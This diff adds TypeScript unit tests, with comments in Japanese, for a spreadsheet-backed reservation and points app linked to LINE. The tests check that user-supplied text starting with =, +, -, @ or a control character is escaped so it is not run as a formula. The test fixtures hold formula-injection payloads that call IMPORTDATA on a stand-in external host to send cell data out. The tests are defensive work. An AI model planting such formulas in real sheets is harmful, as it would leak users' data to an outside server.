@@ -226,3 +226,101 @@ describe('予約を取り消したとき', () => {
     expect(balance()).toBe(1000);
   });
 });
+
+// ---- シートに書く文字: 式として動かされない ----
+// 「=」「+」「-」「@」で始まる文字は、シートが式として動かす。利用者・LINE から来る文字は、先頭に ' を付けて書く。
+describe('シートに書く文字(式の注入を防ぐ)', () => {
+  const evil = '=IMPORTDATA("https://e.example/"&F2)';
+
+  it('先頭が = + - @ タブ 改行 のときだけ、先頭に \' を付ける', () => {
+    ['=1+1', '+1', '-1', '@a', '\tx', '\rx'].forEach((v) => expect(gas.sheetSafe(v), v).toBe("'" + v));
+    ['abc', '', '神埼', 'a=b', ' =1', '1', 'EQ-1'].forEach((v) => expect(gas.sheetSafe(v), v).toBe(v));
+    expect(gas.sheetSafe(5)).toBe(5);
+    expect(gas.sheetSafe(-5)).toBe(-5);
+  });
+
+  it('ポイント台帳: タイトルが式でも、式にならずに書かれる(数のポイントは、そのまま)', () => {
+    put('welcome', 'welcome', 1000);
+    gas.handleSpendPoints('ok', 'EQ-1', 300, evil);
+    const last = rows[rows.length - 1];
+    expect(last[5]).toBe("'" + evil);
+    expect(last[4]).toBe(-300);
+  });
+
+  const sheetsFor = (written: unknown[][]) => ({
+    getSheetByName: () => null,
+    insertSheet: () => ({
+      appendRow: (r: unknown[]) => void written.push(r),
+      getRange: () => ({ setBackground: () => ({ setFontColor: () => ({ setFontWeight: () => undefined }) }) }),
+      setFrozenRows: () => undefined,
+    }),
+  });
+
+  it('クーポン発行ログ: LINE の userId が式でも、式にならずに書かれる', () => {
+    const written: unknown[][] = [];
+    gas.getDataSpreadsheet = () => sheetsFor(written);
+    gas.logCouponIssue(evil, { courseId: 'c', courseName: 'n', reward: 'r' });
+    const row = written.find((r) => r[2] === 'c');
+    expect(row?.[1]).toBe("'" + evil);
+  });
+
+  it('会員の登録: 表示名・メールが式でも、式にならずに書かれる', () => {
+    const written: unknown[][] = [];
+    const store: Record<string, string> = {};
+    const emailEvil = '=importdata("https://e.example/"&f2&"@a.b")';
+    gas.CacheService = {
+      getScriptCache: () => ({
+        get: (k: string) => store[k] ?? null,
+        put: (k: string, v: string) => void (store[k] = v),
+        remove: (k: string) => void delete store[k],
+      }),
+    };
+    store['line_otp_ABC234'] = JSON.stringify({ code: '123456', lineUserId: evil });
+    gas.findMemberByEmail = () => null;
+    gas.getOrCreateMembersSheet = () => ({
+      getDataRange: () => ({ getValues: () => [['会員ID']] }),
+      appendRow: (r: unknown[]) => void written.push(r),
+    });
+    gas.Utilities = { ...gas.Utilities, getUuid: () => 'salt' };
+    gas.hashPassword = () => 'hash';
+    gas.createSessionToken = () => 'tok';
+    const r = gas.handleVerifyLineAndRegister(emailEvil, 'Abcd1!', 'ABC234', '123456', evil);
+    expect(r.status).toBe('success');
+    const row = written[0];
+    expect(row[1]).toBe("'" + emailEvil);
+    expect(row[3]).toBe("'" + evil);
+    expect(row[8]).toBe("'" + evil);
+    expect(r.user.name).toBe(evil); // 画面へ返す名前は、元のまま
+  });
+
+  it('予約: 列車名・座席などが式でも、式にならずに書かれる(日付と時刻の列は、文字の書式のまま)', () => {
+    const written: unknown[][] = [];
+    const cells: Record<string, unknown[]> = {};
+    const headers = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
+    gas.verifySessionToken = () => 'M1';
+    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: evil });
+    gas.getOrCreateReservationsSheet = () => ({
+      getDataRange: () => ({ getValues: () => [headers, ...written] }),
+      appendRow: (r: unknown[]) => void written.push(r),
+      getLastRow: () => written.length + 1,
+      getRange: (row: number, col: number) => ({
+        setNumberFormat: () => undefined,
+        setValue: (v: unknown) => void (cells[`${row},${col}`] = [v]),
+        setValues: () => undefined,
+      }),
+    });
+    const r = gas.handleCreateReservation('t', {
+      orderId: 'EQ-100', trainName: evil, seatNo: '=A1', seatType: '+x', boardingStation: '@b', destinationStation: '-d',
+      totalPrice: 1000, reservedDate: '2026-11-02', departureTime: '10:00', arrivalTime: '11:00',
+    }, false);
+    expect(r.status).toBe('success');
+    const row = written[0] as string[];
+    expect(row[headers.indexOf('列車名')]).toBe("'" + evil);
+    expect(row[headers.indexOf('座席番号')]).toBe("'=A1");
+    expect(row[headers.indexOf('LINE_USER_ID')]).toBe("'" + evil);
+    expect(row[headers.indexOf('乗車駅')]).toBe("'@b");
+    expect(row[headers.indexOf('降車駅')]).toBe("'-d");
+    // 文字の書式の列に、あとから ' が残らないよう、日付・時刻は元の値を書き直す
+    expect(cells[`2,${headers.indexOf('予約日') + 1}`]).toEqual(['2026-11-02']);
+  });
+});
